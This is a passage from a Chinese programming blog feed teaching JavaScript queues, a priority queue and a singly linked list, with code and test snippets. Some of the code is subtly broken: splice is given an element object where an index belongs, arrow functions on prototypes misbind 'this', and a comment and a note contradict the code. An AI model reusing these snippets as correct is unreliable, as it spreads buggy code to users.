class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;Lilei&#x27;</span>, <span class="string">&#x27;Tony&#x27;</span>]</span><br><span class="line"><span class="built_in">console</span>.log(passGame(names, <span class="number">3</span>));<span class="comment">//113</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/4.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/4.png" alt="image-20200305212021550"></a></p><h3 id="三、优先队列"><a href="#三、优先队列" class="headerlink" title="三、优先队列"></a>三、优先队列</h3><p>优先级队列主要考虑的问题为：</p><ul><li>每个元素不再只是一个数据，还包含数据的优先级；</li><li>在添加数据过程中，根据优先级放入到正确位置；</li></ul><h4 id="3-1-优先级队列的实现"><a href="#3-1-优先级队列的实现" class="headerlink" title="3.1.优先级队列的实现"></a>3.1.优先级队列的实现</h4><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 封装优先级队列</span></span><br><span class="line">function PriorityQueue() &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//内部类：在类里面再封装一个类;表示带优先级的数据</span></span><br><span class="line">  function QueueElement(element, priority) &#123;</span><br><span class="line">    <span class="keyword">this</span>.element = element;</span><br><span class="line">    <span class="keyword">this</span>.priority = priority;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 封装属性</span></span><br><span class="line">  <span class="keyword">this</span>.items = []</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1.实现按照优先级插入方法</span></span><br><span class="line">  PriorityQueue.prototype.enqueue = (element, priority) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 1.1.创建QueueElement对象</span></span><br><span class="line">    let queueElement = new QueueElement(element, priority)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.2.判断队列是否为空</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.items.length == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">this</span>.items.push(queueElement)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// 定义一个变量记录是否成功添加了新元素</span></span><br><span class="line">      let added = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">for</span>(let i of <span class="keyword">this</span>.items)&#123;</span><br><span class="line">        <span class="comment">// 让新插入的元素与原有元素进行优先级比较(priority越小，优先级越大)</span></span><br><span class="line">        <span class="keyword">if</span>(queueElement.priority &lt; i.priority)&#123;</span><br><span class="line">          <span class="keyword">this</span>.items.splice(i, <span class="number">0</span>, queueElement)</span><br><span class="line">          added = <span class="literal">true</span></span><br><span class="line">          <span class="comment">// 新元素已经找到插入位置了可以使用break停止循环</span></span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 新元素没有成功插入，就把它放在队列的最前面</span></span><br><span class="line">      <span class="keyword">if</span>(!added)&#123;</span><br><span class="line">        <span class="keyword">this</span>.items.push(queueElement)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.dequeue():从队列中删除前端元素</span></span><br><span class="line">  PriorityQueue.prototype.dequeue = () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.items.shift()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.front():查看前端的元素</span></span><br><span class="line">  PriorityQueue.prototype.front = () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.items[<span class="number">0</span>]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4.isEmpty():查看队列是否为空</span></span><br><span class="line">  PriorityQueue.prototype.isEmpty = () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.items.length == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5.size():查看队列中元素的个数</span></span><br><span class="line">  PriorityQueue.prototype.size = () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.items.length</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 6.toString():以字符串形式输出队列中的元素</span></span><br><span class="line">  PriorityQueue.prototype.toString = () =&gt; &#123;</span><br><span class="line">    let resultString = <span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> (let i of <span class="keyword">this</span>.items)&#123;</span><br><span class="line">        resultString += i.element + <span class="string">&#x27;-&#x27;</span> + i.priority + <span class="string">&#x27; &#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> resultString</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试代码</span></span><br><span class="line"><span class="keyword">let</span> pq = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">pq.enqueue(<span class="string">&#x27;Tom&#x27;</span>,<span class="number">111</span>);</span><br><span class="line">pq.enqueue(<span class="string">&#x27;Hellen&#x27;</span>,<span class="number">200</span>);</span><br><span class="line">pq.enqueue(<span class="string">&#x27;Mary&#x27;</span>,<span class="number">30</span>);</span><br><span class="line">pq.enqueue(<span class="string">&#x27;Gogo&#x27;</span>,<span class="number">27</span>);</span><br><span class="line"><span class="comment">// 打印修改过后的优先队列对象</span></span><br><span class="line"><span class="built_in">console</span>.log(pq);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/5.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/5.png" alt="image-20200226223314535"></a></p><h4 id="3-2-注意点"><a href="#3-2-注意点" class="headerlink" title="3.2.注意点"></a>3.2.注意点</h4><p><strong>关于数组方法splice用法</strong>：</p><ul><li>splice（1，0，’Tom’）：表示在索引为1的元素前面插入元素’Tom‘（也可以理解为从索引为1的元素开始删除，删除0个元素，再在索引为1的元素前面添加元素’Tom’）；</li><li>splice（1，1，’Tom’）：表示从索引为1的元素开始删除（包括索引为1的元素），共删除1个元素，并添加元素’Tom’。即把索引为1的元素替换为元素’Tom’。</li></ul><p><strong>数组的push方法在数组、栈和队列中的形式：</strong></p><ul><li><strong>数组</strong>：在数组[0，1，2]中，pop(3)，结果为[0，1，2，3]；</li><li><strong>栈</strong>：执行pop(0)，pop(1)，pop(2)，pop(3)，从栈底到栈顶的元素分别为：0，1，2，3；如果看成数组，可写为[0，1，2，3]，但是索引为3的元素3其实是栈顶元素；所以说栈的push方法是向栈顶添加元素（但在数组的视角下为向数组尾部添加元素）；</li><li><strong>队列</strong>：enqueue方法可以由数组的push方法实现，与数组相同，相当于在数组尾部添加元素。</li></ul><p><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E9%98%9F%E5%88%97/6.png" alt="image-20200226231025462"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://aiolimp.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://aiolimp.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript实现单向链表</title>
    <link href="http://aiolimp.com/2022/07/07/JavaScript%E5%AE%9E%E7%8E%B0%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/"/>
    <id>http://aiolimp.com/2022/07/07/JavaScript%E5%AE%9E%E7%8E%B0%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/</id>
    <published>2022-07-07T02:23:20.000Z</published>
    <updated>2023-03-05T14:21:44.625Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JavaScript实现单向链表"><a href="#JavaScript实现单向链表" class="headerlink" title="JavaScript实现单向链表"></a>JavaScript实现单向链表</h2><h3 id="一、单向链表简介"><a href="#一、单向链表简介" class="headerlink" title="一、单向链表简介"></a>一、单向链表简介</h3><p>链表和数组一样，可以用于<strong>存储一系列的元素</strong>，但是链表和数组的<strong>实现机制完全不同</strong>。链表的每个元素由一个存储<strong>元素本身的节点</strong>和一个<strong>指向下一个元素的引用</strong>（有的语言称为指针或连接）组成。类似于火车头，一节车厢载着乘客（数据），通过节点连接另一节车厢。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/1.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/1.png" alt="image-20200227110656733"></a></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/2.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/2.png" alt="image-20200227110626750"></a></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/3.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/3.png" alt="image-20200226233942344"></a></p><ul><li>head属性指向链表的第一个节点；</li><li>链表中的最后一个节点指向null；</li><li>当链表中一个节点也没有的时候，head直接指向null；</li></ul><p><strong>数组存在的缺点：</strong></p><ul><li>数组的创建通常需要申请一段<strong>连续的内存空间</strong>（一整块内存），并且大小是固定的。所以当原数组<strong>不能满足容量需求</strong>时，需要<strong>扩容</strong>（一般情况下是申请一个更大的数组，比如2倍，然后将原数组中的元素复制过去）。</li><li>在数组的开头或中间位置插入数据的成本很高，需要进行大量元素的位移。</li></ul><p><strong>链表的优势：</strong></p><ul><li>链表中的元素在内存中<strong>不必是连续的空间</strong>，可以充分利用计算机的内存，实现灵活的<strong>内存动态管理</strong>。</li><li>链表不必在创建时就<strong>确定大小</strong>，并且大小可以<strong>无限地延伸</strong>下去。</li><li>链表在<strong>插入和删除</strong>数据时，<strong>时间复杂度</strong>可以达到O(1)，相对数组效率高很多。</li></ul><p><strong>链表的缺点：</strong></p><ul><li>链表访问任何一个位置的元素时，都需要<strong>从头开始访问</strong>（无法跳过第一个元素访问任何一个元素）。</li><li>无法通过下标值直接访问元素，需要从头开始一个个访问，直到找到对应的元素。</li><li>虽然可以轻松地到达<strong>下一个节点</strong>，但是回到<strong>前一个节点</strong>是很难的。</li></ul><p><strong>链表中的常见操作：</strong></p><ul><li>append（element）：向链表尾部添加一个新的项；</li><li>insert（position，element）：向链表的特定位置插入一个新的项；</li><li>get（position）：获取对应位置的元素；</li><li>indexOf（element）：返回元素在链表中的索引。如果链表中没有该元素就返回-1；</li><li>update（position，element）：修改某个位置的元素；</li><li>removeAt（position）：从链表的特定位置移除一项；</li><li>remove（element）：从链表中移除一项；</li><li>isEmpty（）：如果链表中不包含任何元素，返回trun，如果链表长度大于0则返回false；</li><li>size（）：返回链表包含的元素个数，与数组的length属性类似；</li><li>toString（）：由于链表项使用了Node类，就需要重写继承自JavaScript对象默认的toString方法，让其只输出元素的值；</li></ul><p>首先需要弄清楚：下文中的position指的是两个节点之间，并且与index的关系如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/4.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/4.png" alt="image-20200306101534508"></a></p><p>position的值一般表示position所指位置的下一个节点。当position的值与index的值相等时，比如position = index = 1，那么它们都表示Node2。</p><h3 id="二、封装单向链表类"><a href="#二、封装单向链表类" class="headerlink" title="二、封装单向链表类"></a>二、封装单向链表类</h3><h4 id="2-0-创建单向链表类"><a href="#2-0-创建单向链表类" class="headerlink" title="2.0.创建单向链表类"></a>2.0.创建单向链表类</h4><p>先创建单向链表类Linklist，并添加基本属性，再实现单向链表的常用方法：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 封装单向链表类</span></span><br><span class="line">function LinkList()&#123;</span><br><span class="line">  <span class="comment">// 封装一个内部类：节点类</span></span><br><span class="line">  function Node(<span class="keyword">data</span>)&#123;</span><br><span class="line">    <span class="keyword">this</span>.<span class="keyword">data</span> = <span class="keyword">data</span>;</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 属性</span></span><br><span class="line">  <span class="comment">// 属性head指向链表的第一个节点</span></span><br><span class="line">  <span class="keyword">this</span>.head = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.length = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-append-element"><a href="#2-1-append-element" class="headerlink" title="2.1.append(element)"></a>2.1.append(element)</h4><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一.实现append方法</span></span><br><span class="line">LinkList.prototype.append = <span class="keyword">data</span> =&gt; &#123;</span><br><span class="line">  <span class="comment">//1.创建新节点</span></span><br><span class="line">  let newNode = new Node(<span class="keyword">data</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.添加新节点</span></span><br><span class="line">  <span class="comment">//情况1：只有一个节点时候</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.length == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = newNode</span><br><span class="line">  <span class="comment">//情况2：节点数大于1，在链表的最后添加新节点  </span></span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;              </span><br><span class="line">    <span class="comment">//让变量current指向第一个节点</span></span><br><span class="line">    let current = <span class="keyword">this</span>.head</span><br><span class="line">    <span class="comment">//当current.next(下一个节点不为空)不为空时，一直循环，直到current指向最后一个节点</span></span><br><span class="line">    <span class="keyword">while</span> (current.next)&#123;</span><br><span class="line">      current = current.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后节点的next指向新的节点</span></span><br><span class="line">    current.next = newNode</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3.添加完新结点之后length+1</span></span><br><span class="line">  <span class="keyword">this</span>.length += <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><ul><li>首先让current指向第一个节点：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/5.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/5.png" alt="image-20200227145315369"></a></p><ul><li>通过while循环使current指向最后一个节点，最后通过current.next = newNode，让最后一个节点指向新节点newNode：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/6.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/6.png" alt="image-20200227145453380"></a></p><p><strong>测试代码：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="comment">//1.创建LinkList</span></span><br><span class="line">let list = <span class="built_in">new</span> LinkList()</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.测试append方法</span></span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">console.log(list);  </span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/7.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/7.png" alt="image-20200305234828061"></a></p><h4 id="2-2-toString"><a href="#2-2-toString" class="headerlink" title="2.2.toString()"></a>2.2.toString()</h4><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现toString方法</span></span><br><span class="line">LinkList.prototype.toString = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 1.定义变量</span></span><br><span class="line">  <span class="keyword">let</span> current = <span class="built_in">this</span>.head</span><br><span class="line">  <span class="keyword">let</span> listString = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.循环获取一个个的节点</span></span><br><span class="line">  <span class="keyword">while</span>(current)&#123; </span><br><span class="line">    listString += current.data + <span class="string">&quot; &quot;</span></span><br><span class="line">    current = current.next<span class="comment">//千万不要忘了拼接完一个节点数据之后，让current指向下一个节点</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>  listString</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="comment">//1.创建LinkList</span></span><br><span class="line">let list = <span class="built_in">new</span> LinkList()</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.插入数据</span></span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试toString方法</span></span><br><span class="line">console.log(list.toString());</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/8.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/8.png" alt="image-20200305235437934"></a></p><h4 id="2-3-insert-position-element"><a href="#2-3-insert-position-element" class="headerlink" title="2.3.insert(position,element)"></a>2.3.insert(position,element)</h4><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现insert方法</span></span><br><span class="line">LinkList.prototype.insert = (position, <span class="keyword">data</span>) =&gt; &#123;</span><br><span class="line"><span class="comment">//理解positon的含义：position=0表示新界点插入后要成为第1个节点，position=2表示新界点插入后要成为第3个节点</span></span><br><span class="line">  <span class="comment">//1.对position进行越界判断:要求传入的position不能是负数且不能超过LinkList的length</span></span><br><span class="line">  <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt; <span class="keyword">this</span>.length)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//2.根据data创建newNode</span></span><br><span class="line">  let newNode = new Node(<span class="keyword">data</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//3.插入新节点</span></span><br><span class="line">  <span class="comment">//情况1：插入位置position=0</span></span><br><span class="line">  <span class="keyword">if</span>(position == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// 让新节点指向第一个节点</span></span><br><span class="line">    newNode.next = <span class="keyword">this</span>.head</span><br><span class="line">    <span class="comment">// 让head指向新节点</span></span><br><span class="line">    <span class="keyword">this</span>.head = newNode</span><br><span class="line">  <span class="comment">//情况2：插入位置position&gt;0(该情况包含position=length)</span></span><br><span class="line">  &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    let index = <span class="number">0</span></span><br><span class="line">    let previous = <span class="literal">null</span></span><br><span class="line">    let current = <span class="keyword">this</span>.head</span><br><span class="line">    <span class="comment">//步骤1：通过while循环使变量current指向position位置的后一个节点(注意while循环的写法)</span></span><br><span class="line">    <span class="keyword">while</span>(index++ &lt; position)&#123;</span><br><span class="line">    <span class="comment">//步骤2：在current指向下一个节点之前，让previous指向current当前指向的节点</span></span><br><span class="line">      previous = current</span><br><span class="line">      current = current.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 步骤3：通过变量current(此时current已经指向position位置的后一个节点)，使newNode指向position位置的后一个节点</span></span><br><span class="line">    newNode.next = current</span><br><span class="line">    <span class="comment">//步骤4：通过变量previous，使position位置的前一个节点指向newNode</span></span><br><span class="line">    previous.next = newNode</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      启示：</span></span><br><span class="line"><span class="comment">      1.我们无法直接操作链表中的节点，但是可以通过变量指向这些节点，以此间接地操作节点(替身使者)；</span></span><br><span class="line"><span class="comment">      比如current指向节点3，想要节点3指向节点4只需要：current.next = 4即可。</span></span><br><span class="line"><span class="comment">      2.两个节点间是双向的，想要节点2的前一个节点为节点1，可以通过：1.next=2，来实现；</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//4.新节点插入后要length+1</span></span><br><span class="line">  <span class="keyword">this</span>.length += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>inset方法实现的过程：根据插入节点位置的不同可分为多种情况：</p><ul><li><strong>情况1：position = 0</strong>：</li></ul><p>通过： newNode.next = this.head，建立连接1；</p><p>通过： this.head = newNode，建立连接2；（不能先建立连接2，否则this.head不再指向Node1）</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/9.png"><img 